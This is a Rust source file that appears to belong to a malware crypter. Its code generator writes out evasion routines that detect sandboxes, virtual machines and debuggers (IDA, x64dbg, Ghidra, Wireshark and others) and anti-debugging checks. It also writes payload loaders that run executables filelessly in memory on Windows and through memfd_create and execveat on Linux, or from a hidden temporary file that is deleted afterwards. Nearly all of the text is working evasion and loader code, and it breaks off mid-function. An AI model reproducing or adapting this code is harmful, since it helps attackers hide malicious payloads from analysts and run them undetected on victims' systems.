//! Gate, debug-check, resolver, exec, and integrity emitters.

use crypter_ir::{DebugCheck, ExecutionMethod, Gate, IntegrityCheck, Resolver};
use rand::Rng;

pub fn emit_gate<R: Rng>(
    rng: &mut R,
    name: &str,
    gate: &Gate,
    xor_key: &[u8; 32],
) -> (String, Vec<&'static str>) {
    let mut s = String::new();
    let mut helpers: Vec<&'static str> = Vec::new();

    s.push_str("fn ");
    s.push_str(name);
    s.push_str("() -> bool {\n");

    match gate {
        Gate::UptimeMin(secs) => {
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str("    {\n");
            s.push_str("        return std::fs::read_to_string(\"/proc/uptime\")\n");
            s.push_str("            .ok()\n");
            s.push_str("            .and_then(|s| s.split_whitespace().next().map(|x| x.parse::<f64>().ok()))\n");
            s.push_str("            .flatten()\n");
            s.push_str("            .map(|u| u >= ");
            s.push_str(&secs.to_string());
            s.push_str("f64)\n");
            s.push_str("            .unwrap_or(true);\n");
            s.push_str("    }\n");
            s.push_str("    #[cfg(not(target_os = \"linux\"))]\n");
            s.push_str("    { let _ = ");
            s.push_str(&secs.to_string());
            s.push_str("u64; true }\n");
        }
        Gate::CursorMotion { .. } => {
            s.push_str("    true\n");
        }
        Gate::RamMinMb(mb) => {
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str("    {\n");
            s.push_str("        let m = std::fs::read_to_string(\"/proc/meminfo\").unwrap_or_default();\n");
            s.push_str("        let kb: u64 = m\n");
            s.push_str("            .lines()\n");
            s.push_str("            .find(|l| l.starts_with(\"MemTotal:\"))\n");
            s.push_str("            .and_then(|l| l.split_whitespace().nth(1))\n");
            s.push_str("            .and_then(|v| v.parse().ok())\n");
            s.push_str("            .unwrap_or(0);\n");
            s.push_str("        return kb / 1024 >= ");
            s.push_str(&mb.to_string());
            s.push_str(";\n");
            s.push_str("    }\n");
            s.push_str("    #[cfg(not(target_os = \"linux\"))]\n");
            s.push_str("    { let _ = ");
            s.push_str(&mb.to_string());
            s.push_str("u32; true }\n");
        }
        Gate::CpuCoresMin(n) => {
            s.push_str("    std::thread::available_parallelism()\n");
            s.push_str("        .map(|p| p.get() as u8 >= ");
            s.push_str(&n.to_string());
            s.push_str(")\n");
            s.push_str("        .unwrap_or(true)\n");
        }
        Gate::UsernameBlocklist => {
            s.push_str("    let u = std::env::var(\"USERNAME\")\n");
            s.push_str("        .or_else(|_| std::env::var(\"USER\"))\n");
            s.push_str("        .unwrap_or_default()\n");
            s.push_str("        .to_lowercase();\n");
            s.push_str("    !user_blocklist().iter().any(|b| u.contains(b.as_str()))\n");
        }
        Gate::HostnameBlocklist => {
            s.push_str("    let h = std::env::var(\"COMPUTERNAME\")\n");
            s.push_str("        .or_else(|_| std::env::var(\"HOSTNAME\"))\n");
            s.push_str("        .unwrap_or_default()\n");
            s.push_str("        .to_lowercase();\n");
            s.push_str("    !host_blocklist().iter().any(|b| h.contains(b.as_str()))\n");
        }
        Gate::DomainJoined => {
            s.push_str("    let d = std::env::var(\"USERDOMAIN\").unwrap_or_default();\n");
            s.push_str("    !d.is_empty() && d.to_lowercase() != \"workgroup\"\n");
        }
        Gate::SleepJitter { .. } => {
            s.push_str("    true\n");
        }
        Gate::SleepAccelerationCheck { sleep_ms, min_ratio } => {
            s.push_str("    let t0 = std::time::Instant::now();\n");
            s.push_str("    nt_sleep_ms(");
            s.push_str(&sleep_ms.to_string());
            s.push_str(");\n");
            s.push_str("    let elapsed = t0.elapsed().as_millis() as f64;\n");
            s.push_str("    elapsed >= ");
            s.push_str(&format!("{:.4}", min_ratio));
            s.push_str(" * ");
            s.push_str(&sleep_ms.to_string());
            s.push_str("f64\n");
            helpers.push("nt_sleep_ms");
        }
        Gate::ApiHammerCheck => {
            s.push_str("    #[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
            s.push_str("    {\n");
            s.push_str("        unsafe {\n");
            s.push_str("            let h = load_kernel32();\n");
            s.push_str("            if h.is_null() { return false; }\n");
            s.push_str("            let p = resolve_export(h, b\"CreateFileW\\0\");\n");
            s.push_str("            if p.is_null() { return false; }\n");
            s.push_str("            let first = *p;\n");
            s.push_str("            if first == 0xE9 || first == 0xEB { return false; }\n");
            s.push_str("            if first == 0xFF && *p.add(1) == 0x25 { return false; }\n");
            s.push_str("            return true;\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    #[cfg(not(all(target_os = \"windows\", target_arch = \"x86_64\")))]\n");
            s.push_str("    { true }\n");
            helpers.push("load_kernel32");
            helpers.push("resolve_export");
        }
        Gate::VirtualizationArtifacts => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    {\n");
            s.push_str("        let files: [&str; 10] = [\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vmmouse.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vmhgfs.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vmci.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxMouse.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxGuest.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxSF.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxVideo.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\vboxdisp.dll\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\vboxhook.dll\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\vboxmrxnp.dll\",\n");
            s.push_str("        ];\n");
            s.push_str("        for f in files.iter() {\n");
            s.push_str("            if std::path::Path::new(f).exists() { return false; }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str("    {\n");
            s.push_str("        if let Ok(s) = std::fs::read_to_string(\"/proc/scsi/scsi\") {\n");
            s.push_str("            let l = s.to_lowercase();\n");
            s.push_str("            if l.contains(\"vmware\") || l.contains(\"vbox\") || l.contains(\"qemu\") { return false; }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    true\n");
        }
        Gate::HypervisorCpuid => {
            s.push_str("    #[cfg(all(target_arch = \"x86_64\", any(target_os = \"windows\", target_os = \"linux\")))]\n");
            s.push_str("    {\n");
            s.push_str("        #[cfg(target_arch = \"x86_64\")]\n");
            s.push_str("        unsafe {\n");
            s.push_str("            use std::arch::x86_64::__cpuid;\n");
            s.push_str("            let r = __cpuid(1);\n");
            s.push_str("            if (r.ecx & (1u32 << 31)) != 0 { return false; }\n");
            s.push_str("            let v = __cpuid(0x4000_0000);\n");
            s.push_str("            let mut vendor = [0u8; 12];\n");
            s.push_str("            vendor[0..4].copy_from_slice(&v.ebx.to_le_bytes());\n");
            s.push_str("            vendor[4..8].copy_from_slice(&v.ecx.to_le_bytes());\n");
            s.push_str("            vendor[8..12].copy_from_slice(&v.edx.to_le_bytes());\n");
            s.push_str("            let vs = std::str::from_utf8(&vendor).unwrap_or(\"\");\n");
            s.push_str("            if vs == \"VMwareVMware\" { return false; }\n");
            s.push_str("            if vs == \"VBoxVBoxVBox\" { return false; }\n");
            s.push_str("            if vs == \"KVMKVMKVM\\0\\0\\0\" { return false; }\n");
            s.push_str("            if vs == \"Microsoft Hv\" { return false; }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    true\n");
        }
        Gate::ParentDebugger => {
            s.push_str("    #[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
            s.push_str("    {\n");
            s.push_str("        unsafe {\n");
            s.push_str("            let peb = peb_ptr();\n");
            s.push_str("            if peb.is_null() { return true; }\n");
            s.push_str("            let ppid = *((peb as *const u8).add(0x20) as *const u32);\n");
            s.push_str("            if ppid == 0 { return true; }\n");
            s.push_str("            let k32 = load_kernel32();\n");
            s.push_str("            if k32.is_null() { return true; }\n");
            s.push_str("            let open_p = resolve_export(k32, b\"OpenProcess\\0\");\n");
            s.push_str("            let close_h = resolve_export(k32, b\"CloseHandle\\0\");\n");
            s.push_str("            let query_name = resolve_export(k32, b\"QueryFullProcessImageNameW\\0\");\n");
            s.push_str("            if open_p.is_null() || close_h.is_null() || query_name.is_null() { return true; }\n");
            s.push_str("            let fopen: unsafe extern \"system\" fn(u32, i32, u32) -> *mut c_void = mem::transmute(open_p);\n");
            s.push_str("            let fclose: unsafe extern \"system\" fn(*mut c_void) -> i32 = mem::transmute(close_h);\n");
            s.push_str("            let fquery: unsafe extern \"system\" fn(*mut c_void, u32, *mut u32, *mut u16, *mut u32) -> i32 = mem::transmute(query_name);\n");
            s.push_str("            let h = fopen(0x1000, 0, ppid);\n");
            s.push_str("            if h.is_null() { return true; }\n");
            s.push_str("            let mut buf = [0u16; 512];\n");
            s.push_str("            let mut len: u32 = 512;\n");
            s.push_str("            let mut zero: u32 = 0;\n");
            s.push_str("            let ok = fquery(h, 0, &mut zero, buf.as_mut_ptr(), &mut len);\n");
            s.push_str("            let _ = fclose(h);\n");
            s.push_str("            if ok == 0 { return true; }\n");
            s.push_str("            let name = String::from_utf16_lossy(&buf[..len as usize]).to_lowercase();\n");
            s.push_str("            let bad = [\"ollydbg\",\"x64dbg\",\"x32dbg\",\"windbg\",\"ida\",\"ida64\",\"ghidra\",\"dnspy\",\"radare\",\"r2\",\"processhacker\",\"procmon\",\"wireshark\",\"fiddler\",\"cheatengine\",\"immunity\"];\n");
            s.push_str("            for d in bad.iter() {\n");
            s.push_str("                if name.contains(d) { return false; }\n");
            s.push_str("            }\n");
            s.push_str("            return true;\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    #[cfg(not(all(target_os = \"windows\", target_arch = \"x86_64\")))]\n");
            s.push_str("    { true }\n");
            helpers.push("peb_ptr");
            helpers.push("load_kernel32");
            helpers.push("resolve_export");
        }
        Gate::SnapshotCheck => {
            s.push_str("    #[cfg(target_os = \"windows\")]\n");
            s.push_str("    {\n");
            s.push_str("        let snaps: [&str; 6] = [\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vmmemctl.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vmrawdsk.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vmusbmouse.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vmkbd.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vnetWFP.sys\",\n");
            s.push_str("            \"C:\\\\Windows\\\\System32\\\\drivers\\\\vm3dmp.sys\",\n");
            s.push_str("        ];\n");
            s.push_str("        for f in snaps.iter() {\n");
            s.push_str("            if std::path::Path::new(f).exists() { return false; }\n");
            s.push_str("        }\n");
            s.push_str("        let markers: [&str; 4] = [\n");
            s.push_str("            \"C:\\\\Program Files\\\\VMware\\\\VMware Tools\",\n");
            s.push_str("            \"C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions\",\n");
            s.push_str("            \"C:\\\\Program Files\\\\Parallels\\\\Parallels Tools\",\n");
            s.push_str("            \"C:\\\\Program Files\\\\Qemu-ga\",\n");
            s.push_str("        ];\n");
            s.push_str("        for f in markers.iter() {\n");
            s.push_str("            if std::path::Path::new(f).exists() { return false; }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str("    {\n");
            s.push_str("        if let Ok(s) = std::fs::read_to_string(\"/sys/class/dmi/id/product_name\") {\n");
            s.push_str("            let l = s.to_lowercase();\n");
            s.push_str("            if l.contains(\"vmware\") || l.contains(\"virtualbox\") || l.contains(\"kvm\") || l.contains(\"qemu\") { return false; }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    true\n");
        }
    }

    s.push_str("}\n\n");
    let _ = (rng, xor_key);
    (s, helpers)
}

pub fn emit_debug_check(name: &str, check: &DebugCheck) -> (String, Vec<&'static str>) {
    let mut s = String::new();
    let mut helpers: Vec<&'static str> = Vec::new();

    s.push_str("fn ");
    s.push_str(name);
    s.push_str("() -> bool {\n");

    match check {
        DebugCheck::IsDebuggerPresent => {
            s.push_str("    #[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
            s.push_str("    {\n");
            s.push_str("        unsafe {\n");
            s.push_str("            let k32 = load_kernel32();\n");
            s.push_str("            if k32.is_null() { return false; }\n");
            s.push_str("            let p = resolve_export(k32, b\"IsDebuggerPresent\\0\");\n");
            s.push_str("            if p.is_null() { return false; }\n");
            s.push_str("            let f: unsafe extern \"system\" fn() -> i32 = mem::transmute(p);\n");
            s.push_str("            return f() != 0;\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    #[cfg(target_os = \"linux\")]\n");
            s.push_str("    {\n");
            s.push_str("        if let Ok(st) = std::fs::read_to_string(\"/proc/self/status\") {\n");
            s.push_str("            return st.lines().any(|l| l.starts_with(\"TracerPid:\") && !l.ends_with(\"0\"));\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    false\n");
            helpers.push("load_kernel32");
            helpers.push("resolve_export");
        }
        DebugCheck::PEBBeingDebugged => {
            s.push_str("    #[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
            s.push_str("    {\n");
            s.push_str("        unsafe {\n");
            s.push_str("            let peb = peb_ptr();\n");
            s.push_str("            if !peb.is_null() {\n");
            s.push_str("                return *((peb as *const u8).add(2)) != 0;\n");
            s.push_str("            }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    false\n");
            helpers.push("peb_ptr");
        }
        DebugCheck::NtGlobalFlag => {
            s.push_str("    #[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
            s.push_str("    {\n");
            s.push_str("        unsafe {\n");
            s.push_str("            let peb = peb_ptr();\n");
            s.push_str("            if !peb.is_null() {\n");
            s.push_str("                let f = *((peb as *const u8).add(0xbc) as *const u32);\n");
            s.push_str("                return (f & 0x70) != 0;\n");
            s.push_str("            }\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    false\n");
            helpers.push("peb_ptr");
        }
        DebugCheck::NtQueryInformationProcess => {
            s.push_str("    #[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
            s.push_str("    {\n");
            s.push_str("        unsafe {\n");
            s.push_str("            let ntdll = load_ntdll();\n");
            s.push_str("            if ntdll.is_null() { return false; }\n");
            s.push_str("            let p = resolve_export(ntdll, b\"NtQueryInformationProcess\\0\");\n");
            s.push_str("            if p.is_null() { return false; }\n");
            s.push_str("            let f: unsafe extern \"system\" fn(*mut c_void, u32, *mut u32, u32, *mut u32) -> i32 = mem::transmute(p);\n");
            s.push_str("            let handle: *mut c_void = (-1isize) as *mut c_void;\n");
            s.push_str("            let mut v: u32 = 0;\n");
            s.push_str("            let mut ret: u32 = 0;\n");
            s.push_str("            if f(handle, 7, &mut v, 4, &mut ret) == 0 && v != 0 { return true; }\n");
            s.push_str("            v = 0;\n");
            s.push_str("            if f(handle, 0x1E, &mut v, 4, &mut ret) == 0 && v != 0 { return true; }\n");
            s.push_str("            v = 0;\n");
            s.push_str("            if f(handle, 0x1F, &mut v, 4, &mut ret) == 0 && v == 0 { return true; }\n");
            s.push_str("            return false;\n");
            s.push_str("        }\n");
            s.push_str("    }\n");
            s.push_str("    #[allow(unreachable_code)]\n");
            s.push_str("    false\n");
            helpers.push("load_ntdll");
            helpers.push("resolve_export");
        }
        DebugCheck::TimingCheck { rounds } => {
            s.push_str("    let mut total = 0u128;\n");
            s.push_str("    for _ in 0..");
            s.push_str(&rounds.to_string());
            s.push_str(" {\n");
            s.push_str("        let t0 = std::time::Instant::now();\n");
            s.push_str("        std::thread::sleep(std::time::Duration::from_micros(1));\n");
            s.push_str("        total += t0.elapsed().as_micros();\n");
            s.push_str("    }\n");
            s.push_str("    total / ");
            s.push_str(&rounds.to_string());
            s.push_str(" > 5\n");
        }
        DebugCheck::None => {
            s.push_str("    false\n");
        }
    }

    s.push_str("}\n\n");
    (s, helpers)
}

pub fn emit_anti_emulation(name: &str, sleep_ms: u64, min_ratio: f32) -> (String, Vec<&'static str>) {
    let mut s = String::new();
    s.push_str("fn ");
    s.push_str(name);
    s.push_str("() -> bool {\n");
    s.push_str("    let t0 = std::time::Instant::now();\n");
    s.push_str("    nt_sleep_ms(");
    s.push_str(&sleep_ms.to_string());
    s.push_str(");\n");
    s.push_str("    let elapsed = t0.elapsed().as_millis() as f64;\n");
    s.push_str("    elapsed >= ");
    s.push_str(&format!("{:.4}", min_ratio));
    s.push_str(" * ");
    s.push_str(&sleep_ms.to_string());
    s.push_str("f64\n");
    s.push_str("}\n\n");
    (s, vec!["nt_sleep_ms"])
}

pub fn emit_resolver_fn(name: &str, resolver: &Resolver) -> String {
    let mut s = String::new();
    s.push_str("unsafe fn ");
    s.push_str(name);
    s.push_str("(module: *const u8, hash: u32) -> *const c_void {\n");
    s.push_str("    let _ = (module, hash);\n");
    s.push_str("    ptr::null()\n");
    s.push_str("}\n\n");

    let hash_fn = match resolver {
        Resolver::ExportWalkFnv1a | Resolver::PebWalk => {
            "fn hash_fnv1a(s: &[u8]) -> u32 {\n    let mut h = 0x811c9dc5u32;\n    for &b in s {\n        h ^= b as u32;\n        h = h.wrapping_mul(0x01000193);\n    }\n    h\n}\n"
        }
        Resolver::ExportWalkCrc32 => {
            "fn hash_crc32(s: &[u8]) -> u32 {\n    let mut c = 0xffffffffu32;\n    for &b in s {\n        c ^= b as u32;\n        for _ in 0..8 {\n            c = if c & 1 != 0 { (c >> 1) ^ 0xedb88320 } else { c >> 1 };\n        }\n    }\n    !c\n}\n"
        }
        Resolver::ExportWalkDjb2 => {
            "fn hash_djb2(s: &[u8]) -> u32 {\n    let mut h = 5381u32;\n    for &b in s {\n        h = h.wrapping_mul(33).wrapping_add(b as u32);\n    }\n    h\n}\n"
        }
    };
    s.push_str(hash_fn);
    s.push('\n');
    s
}

/// Emit the exec function.
///
/// Windows x64: in-memory PE loader. Kernel32 FFI isolated in mod k32.
/// Linux: memfd_create + execveat with environ pass-through.
/// Other targets: disk-spawn fallback.
pub fn emit_exec_fn(name: &str, method: &ExecutionMethod) -> String {
    let mut s = String::new();

    let tech_note: &str = match method {
        ExecutionMethod::ImageMap => "image-map",
        ExecutionMethod::ShellcodeInvoke => "shellcode-invoke",
        ExecutionMethod::ProcessHollow { .. } => "process-hollow",
        ExecutionMethod::SpawnInject { .. } => "spawn-inject",
        ExecutionMethod::DirectJump => "direct-jump",
    };

    // ─── dispatcher ───────────────────────────────────────────────
    s.push_str("fn ");
    s.push_str(name);
    s.push_str("(payload: &[u8]) {\n");
    s.push_str("    // technique: ");
    s.push_str(tech_note);
    s.push_str("\n");
    s.push_str("    eprintln!(\"[exec] payload {} bytes\", payload.len());\n");
    s.push_str("    if payload.is_empty() { eprintln!(\"[exec] empty payload\"); return; }\n");

    s.push_str("    #[cfg(target_os = \"windows\")]\n");
    s.push_str("    {\n");
    s.push_str("        if exec_pe_in_memory(payload) {\n");
    s.push_str("            eprintln!(\"[exec] in-memory path succeeded\");\n");
    s.push_str("            return;\n");
    s.push_str("        }\n");
    s.push_str("        eprintln!(\"[exec] in-memory loader failed; falling back to disk spawn\");\n");
    s.push_str("    }\n");

    s.push_str("    #[cfg(target_os = \"linux\")]\n");
    s.push_str("    {\n");
    s.push_str("        if exec_memfd(payload) {\n");
    s.push_str("            eprintln!(\"[exec] memfd path succeeded\");\n");
    s.push_str("            return;\n");
    s.push_str("        }\n");
    s.push_str("        eprintln!(\"[exec] memfd loader failed; falling back to disk spawn\");\n");
    s.push_str("    }\n");

    s.push_str("    exec_disk_spawn(payload);\n");
    s.push_str("}\n\n");

    // ─── disk-spawn fallback ──────────────────────────────────────
    s.push_str("fn exec_disk_spawn(payload: &[u8]) {\n");
    s.push_str("    let unique = format!(\"{}_{}_{}\",\n");
    s.push_str("        std::process::id(),\n");
    s.push_str("        std::time::SystemTime::now()\n");
    s.push_str("            .duration_since(std::time::UNIX_EPOCH)\n");
    s.push_str("            .map(|d| d.as_nanos())\n");
    s.push_str("            .unwrap_or(0),\n");
    s.push_str("        (payload.as_ptr() as usize) & 0xffff,\n");
    s.push_str("    );\n");
    s.push_str("    #[cfg(windows)]\n");
    s.push_str("    let tmp_name = format!(\"svc_{}.exe\", unique);\n");
    s.push_str("    #[cfg(not(windows))]\n");
    s.push_str("    let tmp_name = format!(\"svc_{}\", unique);\n");
    s.push_str("    let mut tmp = std::env::temp_dir();\n");
    s.push_str("    tmp.push(tmp_name);\n");
    s.push_str("    eprintln!(\"[exec] disk-spawn: writing {}\", tmp.display());\n");
    s.push_str("    if let Err(e) = std::fs::write(&tmp, payload) {\n");
    s.push_str("        eprintln!(\"[exec] disk-spawn write failed: {}\", e);\n");
    s.push_str("        return;\n");
    s.push_str("    }\n");
    s.push_str("    #[cfg(unix)]\n");
    s.push_str("    {\n");
    s.push_str("        use std::os::unix::fs::PermissionsExt;\n");
    s.push_str("        let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o755));\n");
    s.push_str("    }\n");
    s.push_str("    let mut cmd = std::process::Command::new(&tmp);\n");
    s.push_str("    #[cfg(windows)]\n");
    s.push_str("    {\n");
    s.push_str("        use std::os::windows::process::CommandExt;\n");
    s.push_str("        cmd.creation_flags(0x08000000);\n");
    s.push_str("    }\n");
    s.push_str("    match cmd.spawn() {\n");
    s.push_str("        Ok(_) => eprintln!(\"[exec] disk-spawn ok\"),\n");
    s.push_str("        Err(e) => { eprintln!(\"[exec] disk-spawn failed: {}\", e); return; }\n");
    s.push_str("    }\n");
    s.push_str("    std::thread::sleep(std::time::Duration::from_secs(3));\n");
    s.push_str("    let _ = std::fs::remove_file(&tmp);\n");
    s.push_str("}\n\n");

    // ─── Linux memfd loader ───────────────────────────────────────
    //
    // Key points:
    //   - memfd_create without MFD_CLOEXEC
    //   - execveat syscall (322 on x86_64) with AT_EMPTY_PATH
    //   - environment is passed through via the C `environ` symbol —
    //     otherwise the child runs with an empty env and can't find
    //     SVC_SECRETS_PATH / HOME / etc.
    s.push_str("#[cfg(target_os = \"linux\")]\n");
    s.push_str("fn exec_memfd(payload: &[u8]) -> bool {\n");
    s.push_str("    use std::ffi::CString;\n");
    s.push_str("    extern \"C\" {\n");
    s.push_str("        fn memfd_create(name: *const i8, flags: u32) -> i32;\n");
    s.push_str("        fn write(fd: i32, buf: *const u8, count: usize) -> isize;\n");
    s.push_str("        fn close(fd: i32) -> i32;\n");
    s.push_str("        fn fork() -> i32;\n");
    s.push_str("        fn syscall(num: i64, ...) -> i64;\n");
    s.push_str("        fn _exit(code: i32) -> !;\n");
    s.push_str("        fn __errno_location() -> *mut i32;\n");
    s.push_str("        fn getpid() -> i32;\n");
    s.push_str("        static environ: *const *const i8;\n");
    s.push_str("    }\n");
    s.push_str("    const SYS_EXECVEAT: i64 = 322;\n");
    s.push_str("    const AT_EMPTY_PATH: i64 = 0x1000;\n");
    s.push_str("    unsafe {\n");
    s.push_str("        let name = match CString::new(\"svc\") {\n");
    s.push_str("            Ok(n) => n,\n");
    s.push_str("            Err(_) => return false,\n");
    s.push_str("        };\n");
    s.push_str("        let fd = memfd_create(name.as_ptr(), 0);\n");
    s.push_str("        if fd < 0 {\n");
    s.push_str("            let errno = *__errno_location();\n");
    s.push_str("            eprintln!(\"[exec-memfd] memfd_create failed errno={}\", errno);\n");
    s.push_str("            return false;\n");
    s.push_str("        }\n");
    s.push_str("        let mut written = 0usize;\n");
    s.push_str("        while written < payload.len() {\n");
    s.push_str("            let remaining = payload.len() - written;\n");
    s.push_str("            let n = write(fd, payload.as_ptr().add(written), remaining);\n");
    s.push_str("            if n <= 0 {\n");
    s.push_str("                let errno = *__errno_location();\n");
    s.push_str("                eprintln!(\"[exec-memfd] write failed at {}/{}, errno={}\", written, payload.len(), errno);\n");
    s.push_str("                let _ = close(fd);\n");
    s.push_str("                return false;\n");
    s.push_str("            }\n");
    s.push_str("            written += n as usize;\n");
    s.push_str("        }\n");
    s.push_str("        eprintln!(\"[exec-memfd] wrote {} bytes to memfd fd={}\", written, fd);\n");
    s.push_str("        let pid = fork();\n");
    s.push_str("        if pid < 0 {\n");
    s.push_str("            let errno = *__errno_location();\n");
    s.push_str("            eprintln!(\"[exec-memfd] fork failed errno={}\", errno);\n");
    s.push_str("            let _ = close(fd);\n");
    s.push_str("            return false;\n");
    s.push_str("        }\n");
    s.push_str("        if pid == 0 {\n");
    s.push_str("            // child\n");
    s.push_str("            let child_pid = getpid();\n");
    s.push_str("            let argv0 = name.as_ptr();\n");
    s.push_str("            let empty = CString::new(\"\").unwrap();\n");
    s.push_str("            let argv: [*const i8; 2] = [argv0, std::ptr::null()];\n");
    s.push_str("            // pass parent's environ through — SVC_SECRETS_PATH, HOME, PATH, etc.\n");
    s.push_str("            let envp: *const *const i8 = environ;\n");
    s.push_str("            if envp.is_null() {\n");
    s.push_str("                eprintln!(\"[exec-memfd] child {} environ is null, passing empty\", child_pid);\n");
    s.push_str("                let empty_envp: [*const i8; 1] = [std::ptr::null()];\n");
    s.push_str("                let r = syscall(\n");
    s.push_str("                    SYS_EXECVEAT,\n");
    s.push_str("                    fd as i64,\n");
    s.push_str("                    empty.as_ptr() as i64,\n");
    s.push_str("                    argv.as_ptr() as i64,\n");
    s.push_str("                    empty_envp.as_ptr() as i64,\n");
    s.push_str("                    AT_EMPTY_PATH,\n");
    s.push_str("                );\n");
    s.push_str("                let errno = *__errno_location();\n");
    s.push_str("                eprintln!(\"[exec-memfd] child {} execveat returned {} errno={}\", child_pid, r, errno);\n");
    s.push_str("            } else {\n");
    s.push_str("                let r = syscall(\n");
    s.push_str("                    SYS_EXECVEAT,\n");
    s.push_str("                    fd as i64,\n");
    s.push_str("                    empty.as_ptr() as i64,\n");
    s.push_str("                    argv.as_ptr() as i64,\n");
    s.push_str("                    envp as i64,\n");
    s.push_str("                    AT_EMPTY_PATH,\n");
    s.push_str("                );\n");
    s.push_str("                let errno = *__errno_location();\n");
    s.push_str("                eprintln!(\"[exec-memfd] child {} execveat returned {} errno={}\", child_pid, r, errno);\n");
    s.push_str("            }\n");
    s.push_str("            _exit(127);\n");
    s.push_str("        }\n");
    s.push_str("        eprintln!(\"[exec-memfd] forked child pid={}\", pid);\n");
    s.push_str("        let _ = close(fd);\n");
    s.push_str("        true\n");
    s.push_str("    }\n");
    s.push_str("}\n\n");

    // ─── Windows PE loader ────────────────────────────────────────
    s.push_str("#[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
    s.push_str("mod k32 {\n");
    s.push_str("    use std::ffi::c_void;\n\n");
    s.push_str("    pub type ThreadStartFn = unsafe extern \"system\" fn(*mut c_void) -> u32;\n\n");
    s.push_str("    #[link(name = \"kernel32\")]\n");
    s.push_str("    extern \"system\" {\n");
    s.push_str("        pub fn LoadLibraryA(name: *const u8) -> *mut c_void;\n");
    s.push_str("        pub fn GetProcAddress(h: *mut c_void, name: *const u8) -> *const c_void;\n");
    s.push_str("        pub fn VirtualAlloc(addr: *const c_void, size: usize, alloc_type: u32, prot: u32) -> *mut c_void;\n");
    s.push_str("        pub fn VirtualProtect(addr: *mut c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> i32;\n");
    s.push_str("        pub fn CreateThread(\n");
    s.push_str("            attrs: *const c_void,\n");
    s.push_str("            stack: usize,\n");
    s.push_str("            start: Option<ThreadStartFn>,\n");
    s.push_str("            param: *const c_void,\n");
    s.push_str("            flags: u32,\n");
    s.push_str("            tid: *mut u32,\n");
    s.push_str("        ) -> *mut c_void;\n");
    s.push_str("        pub fn WaitForSingleObject(h: *mut c_void, ms: u32) -> u32;\n");
    s.push_str("        pub fn CloseHandle(h: *mut c_void) -> i32;\n");
    s.push_str("        pub fn GetLastError() -> u32;\n");
    s.push_str("    }\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
    s.push_str("unsafe extern \"system\" fn pe_entry_thread(lp: *mut c_void) -> u32 {\n");
    s.push_str("    let f: unsafe extern \"system\" fn() -> u32 = mem::transmute(lp);\n");
    s.push_str("    f()\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
    s.push_str("fn section_prot(chars: u32) -> u32 {\n");
    s.push_str("    let x = (chars & 0x20000000) != 0;\n");
    s.push_str("    let r = (chars & 0x40000000) != 0;\n");
    s.push_str("    let w = (chars & 0x80000000) != 0;\n");
    s.push_str("    if x && r && w { 0x40 }\n");
    s.push_str("    else if x && r { 0x20 }\n");
    s.push_str("    else if x { 0x10 }\n");
    s.push_str("    else if r && w { 0x04 }\n");
    s.push_str("    else if r { 0x02 }\n");
    s.push_str("    else { 0x04 }\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(all(target_os = \"windows\", target_arch = \"x86_64\"))]\n");
    s.push_str("fn exec_pe_in_memory(payload: &[u8]) -> bool {\n");
    s.push_str("    unsafe {\n");
    s.push_str("        use k32::*;\n");
    s.push_str("        eprintln!(\"[exec-pe] start\");\n");

    s.push_str("        if payload.len() < 0x100 { eprintln!(\"[exec-pe] too small\"); return false; }\n");
    s.push_str("        if rd_u16(payload, 0) != 0x5a4d { eprintln!(\"[exec-pe] not MZ\"); return false; }\n");
    s.push_str("        let e_lfanew = rd_u32(payload, 0x3c) as usize;\n");
